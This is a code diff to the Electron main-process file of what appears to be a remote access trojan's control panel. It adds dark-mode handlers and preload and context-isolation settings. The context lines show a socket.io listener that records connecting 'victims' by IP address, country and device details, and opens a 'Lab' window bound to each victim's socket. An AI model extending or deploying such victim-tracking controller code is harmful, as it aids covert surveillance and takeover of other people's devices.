@@ -1,10 +1,12 @@
 const { app, BrowserWindow } = require('electron')
 const electron = require('electron');
-const { ipcMain } = require('electron');
+const { ipcMain, nativeTheme } = require('electron');
+const { contextBridge, ipcRenderer } = require('electron/renderer')
 var io = require('socket.io');
 var geoip = require('geoip-lite');
 var victimsList = require('./app/assets/js/model/Victim');
 module.exports = victimsList;
+const path = require('path')
 //--------------------------------------------------------------
 let win;
 let display;
@@ -37,7 +39,7 @@ function createWindow() {
     fullscreen: false,
     webPreferences: {
       nodeIntegration: true,
-      enableRemoteModule: true,
+      enableRemoteModule: true
     }
   });
 
@@ -57,6 +59,7 @@ function createWindow() {
   })
 
 
+
   //------------------------Main SCREEN INIT------------------------------------
   // Create the browser window.
   win = new BrowserWindow({
@@ -72,13 +75,29 @@ function createWindow() {
     frame: false,
     webPreferences: {
       nodeIntegration: true,
-      enableRemoteModule: true
+      contextIsolation: true, 
+      enableRemoteModule: true, // turn off remote
+      preload: path.join(__dirname, "preload.js") // use a preload script
     }
   });
 
+
+  ipcMain.handle('dark-mode:toggle', () => {
+    if (nativeTheme.shouldUseDarkColors) {
+      nativeTheme.themeSource = 'light'
+    } else {
+      nativeTheme.themeSource = 'dark'
+    }
+    return nativeTheme.shouldUseDarkColors
+  })
+  
+  ipcMain.handle('dark-mode:system', () => {
+    nativeTheme.themeSource = 'system'
+  })
+
   win.loadFile(__dirname + '/app/index.html');
   //open dev tools
-  //win.webContents.openDevTools()
+  // win.webContents.openDevTools()
 
   // Emitted when the window is closed.
   win.on('closed', () => {
@@ -155,6 +174,9 @@ ipcMain.on('SocketIO:Listen', function (event, port) {
 
     // Add the victim to victimList
     victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
+
+
+
 
 
     //------------------------Notification SCREEN INIT------------------------------------
@@ -240,6 +262,7 @@ process.on('uncaughtException', function (error) {
 ipcMain.on('openLabWindow', function (e, page, index) {
   //------------------------Lab SCREEN INIT------------------------------------
   // create the Lab window
+
   let child = new BrowserWindow({
     icon: __dirname + '/app/assets/img/icon.png',
     parent: win,
@@ -252,13 +275,15 @@ ipcMain.on('openLabWindow', function (e, page, index) {
     frame: false,
     webPreferences: {
       nodeIntegration: true,
-      enableRemoteModule: true
+      contextIsolation: true, 
+      enableRemoteModule: true, // turn off remote
+      preload: path.join(__dirname, "preload.js") // use a preload script
     }
   })
 
   //add this window to windowsList
   windows[index] = child.id;
-  //child.webContents.openDevTools();
+  // child.webContents.openDevTools();
 
   // pass the victim info to this victim lab
   child.webContents.victim = victimsList.getVictim(index).socket;
